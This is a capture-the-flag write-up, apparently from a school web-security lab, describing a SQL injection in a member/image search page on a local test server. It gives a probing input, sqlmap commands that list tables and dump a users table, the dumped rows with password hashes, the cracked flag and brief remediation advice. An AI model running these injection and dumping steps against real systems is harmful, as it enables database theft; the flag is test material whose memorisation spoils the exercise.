# 02_Sql_injection_member

The GET parameter in the image search form is vulnerable.  


## Method

Go to http://192.168.1.59/index.php?page=searchimg.  
In the search field, search `1 AND 1=1`

## Manipulation

Open terminal (Powershell), run  
```bash
python sqlmap.py --url="http://192.168.1.59/index.php?page=member&id=3&Submit=Submit## --tables
```  

This displays all the databases & their tables.  
Thereafter tables can be dumped  
```bash
python sqlmap.py --url="http://192.168.1.59/index.php?page=member&id=3&Submit=Submit# --dump -T users
```  
where `users` refers to the table name  

```bash
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+------------------------------------------------+
| user_id | town      | planet | country   | last_name | first_name     | Commentaire                                                                   | countersign                                    |
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+------------------------------------------------+
| 1       | Honolulu  | EARTH  | America   | Obama     | Barack Hussein | Amerca !                                                                      | 2b3366bcfd44f540e630d4dc2b9b06d9               |
| 2       | Berlin    | Earth  | Allemagne | Hitler    | Adolf          | Ich spreche kein Deutsch.                                                     | 60e9032c586fb422e2c16dee6286cf10 (oktoberfest) |
| 3       | Moscou    | Earth  | Russia    | Staline   | Joseph         | ????? ????????????? ?????????                                                 | e083b24a01c483437bcf4a9eea7c1b4d               |
| 5       | 42        | 42     | 42        | GetThe    | Flag           | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28               |
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+------------------------------------------------+
```

Decode flag  
```bash
5ff9d0165b4f92b14994e5c685cdce28 -> FortyTwo -> fortytwo -> 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5
```  


## Resolve

- Send form as post request
- Add backend Santatization(prepared statements)

### Resources

https://www.hackers-arise.com/post/2017/04/24/database-hacking-part-4-extracting-data-with-sqlmap  
https://www.md5online.org/md5-decrypt.html  
https://passwordsgenerator.net/sha256-hash-generator/  
